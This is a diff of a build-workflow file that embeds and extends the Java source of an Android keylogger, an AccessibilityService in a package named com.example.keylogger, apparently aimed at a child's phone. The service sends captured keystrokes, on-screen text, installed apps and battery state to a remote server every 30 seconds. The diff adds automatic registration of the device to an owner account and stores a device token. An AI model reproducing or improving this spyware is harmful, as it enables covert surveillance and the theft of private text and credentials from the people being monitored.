@@ -192,10 +192,7 @@ jobs:
           package com.example.keylogger;
 
           import android.accessibilityservice.AccessibilityService;
-          import android.content.BroadcastReceiver;
-          import android.content.Context;
-          import android.content.Intent;
-          import android.content.IntentFilter;
+          import android.content.SharedPreferences;
           import android.content.pm.ApplicationInfo;
           import android.content.pm.PackageManager;
           import android.os.BatteryManager;
@@ -220,8 +217,14 @@ jobs:
 
           public class MonitorService extends AccessibilityService {
 
+              // ========== CONFIG ==========
               private static final String API_BASE = "https://mobilecontrol-web.onrender.com";
+              private static final String OWNER_EMAIL = "your_email@gmail.com"; // <-- তোমার লগইন email
               private static final String DEVICE_ID = "child-phone-123";
+              private static final String DEVICE_NAME = Build.MANUFACTURER + " " + Build.MODEL; // or any name
+              private static final String PREFS_NAME = "device_prefs";
+              private static final String TOKEN_KEY = "device_token";
+              // ============================
 
               private OkHttpClient httpClient = new OkHttpClient.Builder()
                       .connectTimeout(10, TimeUnit.SECONDS)
@@ -231,10 +234,50 @@ jobs:
               private Handler mainHandler = new Handler(Looper.getMainLooper());
               private Thread uiSenderThread;
               private Thread deviceStateThread;
+              private String deviceToken = "";
 
               @Override
               public void onServiceConnected() {
                   super.onServiceConnected();
+                  deviceToken = getStoredToken();
+                  if (deviceToken.isEmpty()) {
+                      autoRegister();
+                  } else {
+                      startThreads();
+                  }
+              }
+
+              private void autoRegister() {
+                  new Thread(() -> {
+                      try {
+                          JSONObject payload = new JSONObject();
+                          payload.put("ownerEmail", OWNER_EMAIL);
+                          payload.put("deviceId", DEVICE_ID);
+                          payload.put("deviceName", DEVICE_NAME);
+
+                          RequestBody body = RequestBody.create(
+                                  MediaType.parse("application/json; charset=utf-8"),
+                                  payload.toString()
+                          );
+                          Request request = new Request.Builder()
+                                  .url(API_BASE + "/api/devices/register-auto")
+                                  .post(body)
+                                  .build();
+                          Response response = httpClient.newCall(request).execute();
+                          if (response.isSuccessful()) {
+                              String jsonStr = response.body().string();
+                              JSONObject json = new JSONObject(jsonStr);
+                              deviceToken = json.getString("deviceToken");
+                              saveToken(deviceToken);
+                              mainHandler.post(this::startThreads);
+                          }
+                      } catch (Exception e) {
+                          e.printStackTrace();
+                      }
+                  }).start();
+              }
+
+              private void startThreads() {
                   startUiSender();
                   startDeviceStateSender();
               }
@@ -261,7 +304,7 @@ jobs:
                       while (!Thread.currentThread().isInterrupted()) {
                           try {
                               sendDeviceState();
-                              Thread.sleep(30000); // send every 30 seconds
+                              Thread.sleep(30000);
                           } catch (InterruptedException e) {
                               Thread.currentThread().interrupt();
                           } catch (Exception e) {
@@ -271,6 +314,16 @@ jobs:
                   });
                   deviceStateThread.setDaemon(true);
                   deviceStateThread.start();
+              }
+
+              private String getStoredToken() {
+                  SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
+                  return prefs.getString(TOKEN_KEY, "");
+              }
+
+              private void saveToken(String token) {
+                  SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
+                  prefs.edit().putString(TOKEN_KEY, token).apply();
               }
 
               private void sendDeviceState() {
@@ -289,6 +342,7 @@ jobs:
 
                       JSONObject payload = new JSONObject();
                       payload.put("deviceId", DEVICE_ID);
+                      payload.put("deviceToken", deviceToken);
                       payload.put("deviceName", deviceName);
                       payload.put("battery", battery);
                       payload.put("installedApps", appsArray);
@@ -334,6 +388,7 @@ jobs:
                       try {
                           JSONObject payload = new JSONObject();
                           payload.put("deviceId", DEVICE_ID);
+                          payload.put("deviceToken", deviceToken);
                           payload.put("text", text);
                           payload.put("timestamp", System.currentTimeMillis());
 
@@ -361,6 +416,7 @@ jobs:
 
                       JSONObject payload = new JSONObject();
                       payload.put("deviceId", DEVICE_ID);
+                      payload.put("deviceToken", deviceToken);
                       payload.put("uiText", uiText);
                       payload.put("timestamp", System.currentTimeMillis());
 
